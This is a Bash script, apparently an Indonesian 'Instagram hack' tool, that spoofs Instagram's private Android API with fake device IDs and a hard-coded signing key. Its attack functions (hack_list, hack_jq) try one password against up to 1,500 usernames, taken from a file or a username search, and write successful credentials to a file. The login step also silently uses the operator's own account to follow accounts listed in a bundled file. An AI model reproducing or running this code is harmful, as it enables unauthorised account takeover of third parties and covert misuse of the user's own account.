#!/bin/bash
# IG @royazizbarera
# coded by: @royazizbarera_900
# If you use any part from this code, give me the credits, please, read the License

# DATA
####################################################################################################################################

string4=$(openssl rand -hex 32 | cut -c 1-4)
string8=$(openssl rand -hex 32  | cut -c 1-8)
string12=$(openssl rand -hex 32 | cut -c 1-12)
string16=$(openssl rand -hex 32 | cut -c 1-16)
device="android-$string16"
uuid=$(openssl rand -hex 32 | cut -c 1-32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"



# KODE WARNA
####################################################################################################################################

W="\033[0m"
B="\033[30;1m"
R="\033[31;1m"
G="\033[32;1m"
Y="\033[33;1m"
BL="\033[34;1m"

BG="\033[40;1m"
RG="\033[41;1m"
GG="\033[42;1m"
YG="\033[43;1m"
BLG="\033[44;1m"


updatesc(){

command -v openssl > /dev/null 2>&1 || { echo >&2 " openssl belum terinstall ketik  apt install openssl-tool "; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 " curl belum terinstall ketik  apt install curl "; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 " wget belum terinstall ketik  apt install wget "; exit 1; }
command -v jq > /dev/null 2>&1 || { echo >&2 " jq belum terinstall ketik  apt install jq "; exit 1; }

}




menu(){

banner
echo -e "${G}[${W}1${G}]${W}.${Y} Hack Instagram Followers User (Masih Ada Bug)"
echo -e "${G}[${W}2${G}]${W}.${Y} Hack Instagram Following User (Masih Ada Bug)"
echo -e "${G}[${W}3${G}]${W}.${Y} Hack Instagram From List File"
echo -e "${G}[${W}4${G}]${W}.${Y} Hack Instagram Pake J-Query Automatis"
echo -e "${G}[${W}0${G}]${W}.${R} Exit"
echo ""
echo -ne "${G}[${W}*${G}]${Y}Pilih metode serangan : ${W}" ; read mnu
if [[ $mnu == 1 ]]; then
clear
banner
echo -e "${G}Sabar gaess masih di update${W}"

elif [[ $mnu == 2 ]]; then
clear
banner
echo -e "${G}Sabar gaess masih di update${W}"

elif [[ $mnu == 3 ]]; then
clear
banner
hack_list

elif [[ $mnu == 4 ]]; then
clear
banner
hack_jq

elif [[ $mnu == 0 ]]; then
exit 1

else
echo -e "${R}Pilih yang ada aj goblk :v${W}"
sleep 2
clear
menu
fi
}


banner(){
echo ""
echo -e "${G}db     ${Y} d888888b${G} .88b  d88.${Y} d888888b${G} d888888b "
echo -e "${G}88     ${Y}    88   ${G} 88 YbdP 88${Y}    88   ${G}  ~~88~~  "
echo -e "${G}88     ${Y}    88   ${G} 88  88  88${Y}    88   ${G}    88    "
echo -e "${G}88     ${Y}    88   ${G} 88  88  88${Y}    88   ${G}    88    "
echo -e "${G}88booo.${Y}   .88.  ${G} 88  88  88${Y}   .88.  ${G}    88    "
echo -e "${G}Y88888P${Y} Y888888P${G} YP  YP  YP${Y} Y888888P${G}    YP    "
echo ""
}

gas(){
menu
}

follow() {

username_id=$(curl -L -s 'https://www.instagram.com/'$user'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')

user_id=$(curl -L -s 'https://www.instagram.com/'$user_account'' > getid && grep -o  'profilePage_[0-9]*.' getid | cut -d "_" -f2 | tr -d '"')
data='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$user_id'", "_csrftoken":"'$var2'"}'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
curl -L -b cookie -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$user_id/" 


}



follow12(){

for celeb in $(cat f/roy); do

data12='{"_uuid":"'$guid'", "_uid":"'$username_id'", "user_id":"'$celeb'", "_csrftoken":"'$var2'"}'
hmac12=$(echo -n "$data12" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
check_follow=$(curl -s -L -b cookie.$user12 -d "ig_sig_key_version=4&signed_body=$hmac12.$data12" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$celeb/" | grep -o '"following": true')

if [[ $check_follow == "" ]]; then
printf "\n\e[1;93m [!] Error\n"
exit 1
else
printf "\e[1;92mOK\e[0m\n"
sleep 2
clear
gas
fi

sleep 3

done


}




cek(){
updatesc
git pull origin master
FILE=l/o/g/i/n/login.txt
if [[ -f "$FILE" ]]; then
echo -e "${G}FILE DAH DIBUAT TOD"
sleep 2
else
    
mkdir l
mkdir l/o
mkdir l/o/g
mkdir l/o/g/i
mkdir l/o/g/i/n
touch l/o/g/i/n/login.txt
echo -e "${G}FILE BaRU DIBUAT TOD"
sleep 2
fi


if [[ $(cat l/o/g/i/n/login.txt) == "royazizbarera" ]] ;then
echo -e "${G}Oke lu udah login Instagram lu, ${W}Gass lah"
sleep 2
clear 
gas
else
echo -e "${M}Lu belum pernah login ya tot"
echo -e "${B}Login DUlu Yak, hayyuk${W}"
sleep 4
clear
banner
login12
fi
}





login12() {


printf "\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Login Instagram\e[0m\n"

read -p $'\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Username: \e[0m' user12

read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Password: \e[0m' pass12

printf "\n"

data12='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user12'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass12'", "login_attempt_count":"0"}'

IFS=$'\n'

hmac12=$(echo -n "$data12" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying to login as\e[0m\e[1;93m %s\e[0m\n" $user12
IFS=$'\n'
var12=$(curl -c cookie.$user12 -d "ig_sig_key_version=4&signed_body=$hmac12.$data12" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
if [[ $var12 == "challenge" ]]; then 
printf "\e[1;93m\n[!] Mampus kena sesi\n" ; exit 1; 

elif [[ $var12 == "logged_in_user" ]]; then 
printf "\e[1;92m \n[+] Login Sukses\n" ; 
printf royazizbarera >> l/o/g/i/n/login.txt
sleep 3
clear
follow12

elif [[ $var12 == "Please wait" ]]; then 
echo "Yahahaha hayuuk"; 

else
echo -e "${R}Aowkwokwokwokwok gagal login, \n Ulangi lagi ${W}"
sleep 3
clear
banner
login12
fi
}

hack_list(){
login_user() {
# TANYA PASSWORD SAMA FILE
#
####################################################################################################################################
read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m File List Password : \e[0m' target
read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Password Using     : \e[0m' pass
for user in $(sed -n ''1','1500'p' $target); do
####################################################################################################################################
printf "\n"
data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
IFS=$'\n'
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
# EKSEKUSI LOGIN
#
####################################################################################################################################
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying to login as\e[0m\e[1;93m %s\e[0m\n" $user
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying password as\e[0m\e[1;93m %s\e[0m\n" $pass
####################################################################################################################################
IFS=$'\n'
# VAR COOKIE
#
####################################################################################################################################
var=$(curl -c cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
####################################################################################################################################
# OUTPUT 
#CHALLENGE
if [[ $var == "challenge" ]]; then
echo -e "\e[0m========================================"
printf "\e[32;5m[!] Challenge required" ;
printf "\n\e[32;5m [*] Password Found: \e[0m%s        " $pass;
printf "[LOGIN CHALLENGE] Username: %s, Password: %s\n" $user $pass >> limit.found ;      
printf "\n\e[1;92m [*] Saved:\e[0m\e[1;77m limit.found \n\e[0m";
echo -e "\e[0m========================================"
#LOGIN SUKSES
elif [[ $var == "logged_in_user" ]]; then
echo -e "\e[0m========================================"
printf "\e[32;1m [+] Login Successful   " ;                                            
printf "\n\e[32;1m [*] Password Found: \e[0m%s        " $pass ;
printf "[LOGIN SUCCESS] Username: %s, Password: \e[0m%s\n" $user $pass >> limit.found ;
printf "\n\e[1;92m [*] Saved:\e[0m\033[5m limit.found \n\e[0m";
echo -e "\e[0m========================================"
# BANNED WAKTU
elif [[ $var == "Please wait" ]]; then 
echo "Please wait"; fi;
done
}
login_user
}


hack_jq(){
# ASK
read -p $'\e[32;1mSearch by query Username : \e[0m' askjq
# QUERY
collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${askjq}" | jq -r '.users[].user.username' > query)
echo $'\e[33;1mHanya menemukan : \e[1;33m'$collect''$(< query wc -l ; echo -e "${W}user")

# TANYA PASSWORD SAMA FILE
#
####################################################################################################################################
#read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m File List Password : \e[0m' targetjq
#read -p $'\e[1;31m[\e[0m\e[1;77m*\e[0m\e[1;31m]\e[0m\e[1;93m Password Using     : \e[0m' pass

passjq="${askjq}"
userjq="query"

for userjq in $(sed -n ''1','1500'p' $targetjq); do
####################################################################################################################################
printf "\n"
datajq='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$userjq'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$passjq'", "login_attempt_count":"0"}'
IFS=$'\n'
hmacjq=$(echo -n "$datajq" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
# EKSEKUSI LOGIN
#
####################################################################################################################################
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying to login as\e[0m\e[1;93m %s\e[0m\n" $userjq
printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Trying password as\e[0m\e[1;93m %s\e[0m\n" $passjq
####################################################################################################################################
IFS=$'\n'
# VAR COOKIE
#
####################################################################################################################################
varjq=$(curl -c cookie.$userjq -d "ig_sig_key_version=4&signed_body=$hmac.$datajq" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); 
####################################################################################################################################
# OUTPUT 
#CHALLENGE
if [[ $varjq == "challenge" ]]; then
echo -e "\e[0m========================================"
printf "\e[32;5m[!] Challenge required" ;
printf "\n\e[32;5m [*] Password Found: \e[0m%s        " $passjq;
printf "[LOGIN CHALLENGE] Username: %s, Password: %s\n" $userjq $passjq >> limit.found ;      
printf "\n\e[1;92m [*] Saved:\e[0m\e[1;77m limit.found \n\e[0m";
echo -e "\e[0m========================================"
#LOGIN SUKSES
elif [[ $varjq == "logged_in_user" ]]; then
echo -e "\e[0m========================================"
printf "\e[32;1m [+] Login Successful   " ;                                            
printf "\n\e[32;1m [*] Password Found: \e[0m%s        " $passjq ;
printf "[LOGIN SUCCESS] Username: %s, Password: \e[0m%s\n" $userjq $passjq >> limit.found ;
printf "\n\e[1;92m [*] Saved:\e[0m\033[5m limit.found \n\e[0m";
echo -e "\e[0m========================================"
# BANNED WAKTU
elif [[ $varjq == "Please wait" ]]; then 
echo "Please wait"; fi;
done
}


clear

banner
cek
#login12
#menu
